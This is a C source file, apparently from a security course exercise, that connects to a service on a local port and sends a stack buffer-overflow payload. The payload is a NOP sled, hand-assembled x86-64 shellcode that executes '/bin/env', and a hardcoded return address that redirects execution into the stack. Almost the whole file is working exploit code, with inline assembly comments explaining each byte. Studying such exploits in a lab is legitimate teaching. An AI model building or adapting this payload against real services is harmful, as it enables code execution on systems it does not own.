#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>

char inbuff[1024];

void DoAttack(int PortNo);
void Attack(FILE * outfile);

int main(int argc, char * argv[]){

    char * studStr, *portStr;
    int studLen, portLen;
    int studNo, portNo;
    int i;

    if (argc != 2){
        fprintf(stderr, "usage %s portno\n", argv[0]);
        exit(1);
    }

    portStr = argv[1];
    if ((portLen = strlen(portStr)) < 1){
        fprintf(stderr, "%s: port number must be 1 or more digits\n", argv[0]);
        exit(1);
    }
    for (i = 0; i < portLen; i++){
        if(!isdigit(portStr[i])){
            fprintf(stderr, "%s: port number must be all digits\n", argv[0]);
            exit(1);
        }
    }
    portNo = atoi(portStr);

    fprintf(stderr, "Port Number  %d\n", portNo);

    DoAttack(portNo);

    exit(0);
}

void  DoAttack(int portNo) {
    int server_sockfd;
    int serverlen;

    struct sockaddr_in server_address;

    FILE * outf;
    FILE * inf;
    struct hostent *h;


    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if((h=gethostbyname("localhost"))==NULL){
        fprintf(stderr,"Host Name Error...");
        exit(1);
    }

    server_address.sin_family = AF_INET;
    memcpy((char *) &server_address.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
    /* server_address.sin_addr.s_addr = htonl(INADDR_ANY); */
    server_address.sin_port = htons(portNo);

    if(connect(server_sockfd,(struct sockaddr*)&server_address,sizeof(struct sockaddr))==-1){
        fprintf(stderr,"Connection out...");
        exit(1);
    }

    outf = fdopen(server_sockfd, "w");

    // add log message here
    Attack(outf);

    inf = fdopen(server_sockfd, "r");
    if (inf == NULL){
        fprintf(stderr,"could not open socket for read");
        exit(1);
    }
    do {
        inbuff[0] = '\0';
        fgets(inbuff,1024,inf);
        if (inbuff[0]){
            fputs(inbuff,stdout);
        }
    } while (!feof(inf));
    fclose(outf);
    fclose(inf);
    return;
}

char compromise[224] = {
    //NOP Size: 95
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                 // NOP padding
    0x90, 0x90, 0x90, 0x90, 0x90,                                   // NOP padding

    //Initial Exploit Size: 115
    0x48, 0x31, 0xC0,                  //start:      xor rax, rax
    0x50,                                  //push rax
    0x48, 0x31, 0xC0,                              //xor rax, rax
    0x48, 0xB8, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x65, 0x6E,                 //mov rax, '/bin/env'
    0x76,                 
    0x50,                                  //push rax
    0x48, 0x89, 0xE7,                              //mov rdi, rsp
    0x48, 0x31, 0xC0,                              //xor rax, rax
    0x50,                                  //push rax
    0x57,                                  //push rdi
    0x48, 0x89, 0xE6,                              //mov rsi, rsp
    0x48, 0x31, 0xD2,                              //xor rdx, rdx
    0x66, 0xBA, 0xFF, 0x7F,                            //mov dx, 0x7fff
    0x48, 0xC1, 0xE2, 0x20,                            //shl rdx, 32
    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,                          //mov ecx, 0xf7fbe6ff
    0x30, 0xC9,                                //xor cl, cl
    0x48, 0x09, 0xCA,                              //or rdx, rcx
    0x48, 0x8B, 0x12,                              //mov rdx, [rdx]
    0x48, 0x31, 0xC0,                              //xor rax, rax
    0xB0, 0x3B,                                //mov al, 0x3B
    0x0F, 0x05,                                //syscall
    0xB0, 0x3C,                                //mov al, 0x3c
    0x48, 0x89, 0xC7,                              //mov rdi, rax
    0x0F, 0x05,                                //syscall
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
    //6B000000                //end:        dd end-start
    
    //Return Address Stack Pointer: 0x7fffffffe068 - 0x98 (152 Chars) = 0x7FFFFFFFDFD0
    //Return Adress Size: 7
    0xD0, 0xDF, 0xFF, 0xFF, 0xFF, 0x7F,
    0x0A, //New Line
    0x00 //Null Byte
};

char *compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxx"
    "MNOPWXYZ"
    "xxxxxxxx\n";
    //Size: 225

//Client: MD5=b155faab775d812dd66ac9fcd4651e36

// change to write so we can write NULLs
void Attack(FILE * outfile){
    fprintf(outfile, "%s", compromise);  
    fflush(outfile);
}

